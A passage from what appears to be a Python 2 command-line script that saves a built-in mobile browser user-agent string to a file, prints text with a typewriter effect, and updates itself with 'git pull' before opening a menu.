		except KeyboardInterrupt:
			exit ("\x1b[1;91m•  Error ")
	elif romi =='n' or romi =='N':
		try:
			ua = ('Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)')
			uas = open("ua.txt","w")
			uas.write(ua)
			uas.close();time.sleep(2)
			print ("\n\x1b[1;92m• Using the built-in user agent");time.sleep (2)
			menu()
		except KeyboardInterrupt:
			exit ("\x1b[1;91m•  Error ")
	else:
		print '\x1b[1;91m• Wrong Input'
		os.sys.exit()
	
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.06)
        
def jajan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)


if __name__ == '__main__':
	os.system ('git pull')
	#license_rom()
	menu()
